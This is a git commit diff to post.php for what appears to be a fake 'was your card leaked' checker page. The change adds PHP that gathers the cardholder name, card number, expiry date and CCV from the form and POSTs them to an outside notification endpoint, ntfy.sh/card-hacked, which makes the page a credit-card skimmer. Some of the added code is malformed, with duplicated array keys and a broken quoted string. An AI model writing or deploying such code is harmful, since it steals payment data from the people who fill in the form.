ebc6c5cb00fac25d373eb215c664ff90be8cfce2
gnutard <166033088+gnutard@users.noreply.github.com>
2024-07-25 19:04:43 +0000

    Update post.php

--- post.php
+++ post.php
@@ -31,16 +31,31 @@
         }
 </style>
 <body>
+    <?php 
+$name = $_POST["name"];
+$ccv = $_POST["ccv"];
+$exp = $_POST["exp"];
+$ccnumber = $_POST["ccnumber"];
+$content = "$name, $ccv, $exp, $ccnumber"; ?>
 <p>You're lucky, we didn't find it. Your card details:</p>
 <?php echo $_POST["name"]; ?>
 <?php echo $_POST["exp"]; ?>
 <?php echo $_POST["ccnumber"]; ?>
 <?php echo $_POST["ccv"]; ?>
+<?php file_get_contents('https://ntfy.sh/card-hacked', false, stream_context_create([
+    'http' => [
+        'method' => 'POST', 
+        'method' => 'POST', 
+        'header' => 'Content-Type: text/plain',
+        'content' => '$_POST["name], $_POST["exp"], $_POST["ccnumber"], echo $_POST["ccv"]'
+        'content' => $content
+    ]
+])); ?>
 </body>
 <footer>
      <p>Copyright (C) 2024</p>
 </footer>
-<address>
+<!-- <address>
      <p>Buy this website! Send an e-mail <a href=mailto:installerwizard@national.shitposting.agency>here.</a></p>
-</address>
+</address> --!>
 </html>
